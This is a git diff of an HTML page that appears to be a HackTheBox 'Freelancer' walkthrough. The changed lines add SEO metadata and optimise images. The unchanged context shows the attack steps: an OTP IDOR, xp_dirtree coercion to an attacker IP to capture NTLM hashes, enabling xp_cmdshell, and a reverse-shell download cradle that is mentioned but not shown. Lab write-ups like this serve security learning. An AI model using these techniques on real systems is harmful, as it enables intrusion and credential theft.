@@ -350,6 +350,36 @@
   .sql .sv { color: #ce9178; }
   .sql .sc { color: #6a9955; }
 </style>
+<script id="noctis-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Freelancer",
+  "description": "HackTheBox Freelancer machine walkthrough — full writeup with screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://sp1r4.github.io/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "NOCTIS",
+    "url": "https://sp1r4.github.io/"
+  },
+  "url": "https://sp1r4.github.io/writeups/htb-freelancer.html",
+  "image": "https://sp1r4.github.io/writeups/assets/og/htb-freelancer.svg",
+  "keywords": [
+    "hackthebox"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sp1r4.github.io/blog.html#htb-freelancer"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
 </head>
 <body>
 <a href="../blog.html" class="writeup-back-link" style="position:fixed;top:18px;left:18px;z-index:9999;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;" onmouseover="this.style.transform='translateX(-2px)';this.style.background='rgba(26,26,24,1)'" onmouseout="this.style.transform='';this.style.background='rgba(26,26,24,0.92)'"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
@@ -383,7 +413,7 @@
 
   <hr class="divider">
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-01-02c35da635.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="HTB Freelancer machine card">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-01-02c35da635.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-01-02c35da635.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="HTB Freelancer machine card" width="1200" height="675"></picture>
 
   <div class="overview">
     Freelancer starts with gaining access as an employer, then escalating to admin via an <strong>IDOR vulnerability</strong> in the QR-Code OTP login flow. From there, a SQL terminal exposes MSSQL commands allowing impersonation of <code>sa</code> and enabling <code>xp_cmdshell</code> for a reverse shell. After pivoting through users via credential files and a <strong>memory dump</strong>, the path to Domain Admin goes through <strong>Resource-Based Constrained Delegation (RBCD)</strong>.
@@ -445,31 +475,31 @@ Unable to connect with SMB1 -- no workgroup available</span></div>
   <h2>Website &#8212; TCP 80</h2>
   <p>The site is a job board platform with Freelancer and Employer registration.</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-02-8749a41f50.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Freelancer website homepage">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-02-8749a41f50.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-02-8749a41f50.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Freelancer website homepage" width="1920" height="825"></picture>
 
   <p>Register as a freelancer first. Nothing useful found when enumerating as freelancer.</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-03-f62d61e78d.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Freelancer profile dashboard — howdy namiq">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-03-f62d61e78d.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-03-f62d61e78d.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Freelancer profile dashboard — howdy namiq" width="1920" height="630"></picture>
 
   <p>Register as an <strong>employer</strong> next — but login fails immediately after registration:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-04-1cb5b2d6ba.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Employer account not activated error">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-04-1cb5b2d6ba.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-04-1cb5b2d6ba.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Employer account not activated error" width="1919" height="733"></picture>
 
   <h3>Account recovery bypass</h3>
   <p>Use the Account Recovery form. The security questions accept trivially guessable answers (all set to the same value during registration). This reactivates the account and allows a password reset:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-05-6730b4d2ef.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Account recovery form — bob/bob/bob/bob">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-05-6730b4d2ef.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-05-6730b4d2ef.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Account recovery form — bob/bob/bob/bob" width="1919" height="729"></picture>
 
   <p>Now inside as employer <code>bob</code>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-06-89bcb73b57.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Employer dashboard — Howdy bob">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-06-89bcb73b57.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-06-89bcb73b57.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Employer dashboard — Howdy bob" width="1918" height="738"></picture>
 
   <h2>IDOR &#8212; Insecure Direct Object Reference</h2>
   <h3>QR-Code section</h3>
   <p>The <strong>QR-Code</strong> menu item generates an OTP login URL. Scanning reveals the token encodes the current user's numeric ID in base64:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-07-257d76ca2c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="QR-Code page in employer dashboard">
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-08-0bd858716c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="OTP URL with base64 user ID visible">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-07-257d76ca2c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-07-257d76ca2c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="QR-Code page in employer dashboard" width="1918" height="777"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-08-0bd858716c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-08-0bd858716c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="OTP URL with base64 user ID visible" width="1918" height="801"></picture>
 
   <div class="alert alert-info">
     OTP URL format: <code>http://freelancer.htb/accounts/login/otp/&lt;base64_uid&gt;/&lt;token&gt;</code><br>
@@ -488,23 +518,23 @@ Unable to connect with SMB1 -- no workgroup available</span></div>
 <span class="pg">http://freelancer.htb/accounts/login/otp/Mgo=/e4ff26...</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-09-8f5dde1623.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Logged in as admin — Howdy admin">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-09-8f5dde1623.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-09-8f5dde1623.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Logged in as admin — Howdy admin" width="1919" height="825"></picture>
 
   <h2>/admin &#8212; SQL Terminal</h2>
   <p>The admin panel exposes a <strong>SQL Terminal</strong> under Development Tools:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-10-d5d2755c24.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Admin dashboard with SQL Terminal in Development Tools">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-10-d5d2755c24.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-10-d5d2755c24.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Admin dashboard with SQL Terminal in Development Tools" width="1880" height="468"></picture>
 
   <h3>Current user</h3>
   <div class="sql"><span class="sk">SELECT</span> <span class="sf">user_name</span>();
 <span class="sc">-- Result: Freelancer_webapp_user</span></div>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-11-9cc1095ddd.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SQL terminal showing Freelancer_webapp_user result">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-11-9cc1095ddd.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-11-9cc1095ddd.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SQL terminal showing Freelancer_webapp_user result" width="1906" height="548"></picture>
 
   <h3>Capturing NTLM hash via xp_dirtree</h3>
   <div class="sql">xp_dirtree <span class="sv">'\\10.10.14.16\zip'</span></div>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-12-2371e23fb1.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Responder output capturing NTLM hash from sql_svc">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-12-2371e23fb1.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-12-2371e23fb1.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Responder output capturing NTLM hash from sql_svc" width="1883" height="432"></picture>
 
   <div class="alert alert-warn">The hash is uncrackable. Pivot to SQL privilege escalation instead.</div>
 
@@ -523,9 +553,9 @@ Unable to connect with SMB1 -- no workgroup available</span></div>
 <span class="sk">EXEC</span> <span class="sf">sp_configure</span> <span class="sv">'show advanced options'</span>, <span class="sv">'1'</span>; RECONFIGURE;
 <span class="sk">EXEC</span> <span class="sf">sp_configure</span> <span class="sv">'xp_cmdshell'</span>, <span class="sv">'1'</span>; RECONFIGURE;</div>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-13-df64384fc9.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Initial xp_cmdshell permission denied error">
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-14-58fe588c73.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="IS_SRVROLEMEMBER returning 1 — sysadmin confirmed">
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-15-fe0b848fb3.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="xp_cmdshell whoami showing freelancer\sql_svc">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-13-df64384fc9.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-13-df64384fc9.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Initial xp_cmdshell permission denied error" width="1881" height="468"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-14-58fe588c73.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-14-58fe588c73.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="IS_SRVROLEMEMBER returning 1 — sysadmin confirmed" width="1880" height="516"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-15-fe0b848fb3.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-15-fe0b848fb3.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="xp_cmdshell whoami showing freelancer\sql_svc" width="1290" height="307"></picture>
 
   <h3>Reverse shell</h3>
   <p>Direct shells are blocked by AV. Use a PowerShell download-cradle:</p>
@@ -604,7 +634,7 @@ The file is on the Desktop.</span></div>
 
   <p><code>lorra199</code> is a member of <strong>AD Recycle Bin</strong>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-freelancer/img-16-bc69aa17c6.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Bloodhound: lorra199 MemberOf AD Recycle Bin">
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-16-bc69aa17c6.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-16-bc69aa17c6.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Bloodhound: lorra199 MemberOf AD Recycle Bin" width="1211" height="418"></picture>
 
   <p><strong>AD Recycle Bin</strong> has <code>GenericWrite</code> on the Domain Controller <code>DC$</code>:</p>
 
